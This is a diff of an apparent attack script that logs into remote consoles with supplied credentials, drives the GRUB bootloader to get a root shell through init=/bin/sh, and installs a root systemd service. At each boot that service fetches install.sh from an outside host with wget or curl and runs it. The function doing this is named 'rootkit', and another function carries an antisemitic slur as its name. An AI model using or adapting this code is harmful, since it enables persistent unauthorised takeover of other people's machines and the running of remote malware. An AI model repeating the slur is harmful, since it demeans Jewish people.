@@ -31,33 +31,30 @@ async def grub_enter(client):
 
 async def grub_boot(client):
     for x in [
-            "insmod lvm;",
-            "search --file --set=r /bin/sh;",
-            "probe --set=u -u $r;",
-            "insmod regexp;",
-            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/vmlinu.*" "$b"; then set l=$b;break 2;fi;done;fi;if regexp ".*/vmlinu.*" "$a"; then set l=$a; break;fi;done;',
-            'regexp ".*/vmlinu.(.*)" $l --set v;',
-            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/initr.*$v" "$b"; then set i=$b;break 2;fi;done;fi;if regexp ".*/initr.*$v" "$a"; then set i=$a;break;fi;done;',
-            "linux $l root=UUID=$u rw init=/bin/sh;",
-            "initrd $i;",
-            "boot;"
+            "insmod lvm",
+            "search --file --set=r /bin/sh",
+            "probe --set=u -u $r",
+            "insmod regexp",
+            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/vmlinu.*" "$b"; then set l=$b;break 2;fi;done;fi;if regexp ".*/vmlinu.*" "$a"; then set l=$a; break;fi;done',
+            'regexp ".*/vmlinu.(.*)" $l --set v',
+            'for a in ($root)/*; do if [ "$a" = "($root)/boot" ]; then for b in ($root)/boot/*; do if regexp ".*/initr.*$v" "$b"; then if ! regexp "kdump" "$b"; then set i=$b;break 2;fi;fi;done;fi;if regexp ".*/initr.*$v" "$a"; then if ! regexp "kdump" "$a"; then set i=$a;break;fi;fi;done',
+            "linux $l root=UUID=$u rw init=/bin/sh",
+            "initrd $i",
+            "boot"
     ]:
-        await write(client, x)
-        await asyncio.sleep(0.5)
-        client.keyboard.press("Return")
-        await asyncio.sleep(7.5)
+        await write(client, x + ";")
+    client.keyboard.press("Return")
+    await asyncio.sleep(15)
 
 async def rootkit(client):
     await asyncio.sleep(20)
     for x in [
-            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=/bin/sh -c \'(wget flamecord.zixel.tk/install.sh -O/install.sh || curl -L flamecord.zixel.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
-            "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service;",
-            "reboot -f || sbin/reboot -f;",
+            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=/bin/sh -c \'(wget flamecord.zixel.tk/install.sh -O/install.sh || curl -L flamecord.zixel.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service',
+            "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service",
+            "reboot -f || sbin/reboot -f",
     ]:
-        await write(client, x)
-        await asyncio.sleep(0.5)
-        client.keyboard.press("Return")
-        await asyncio.sleep(7.5)
+        await write(client, x + ";")
+    client.keyboard.press("Return")
 
 async def jew(ip, port, username, password):
     print(f"connecting to {ip}:{port}")
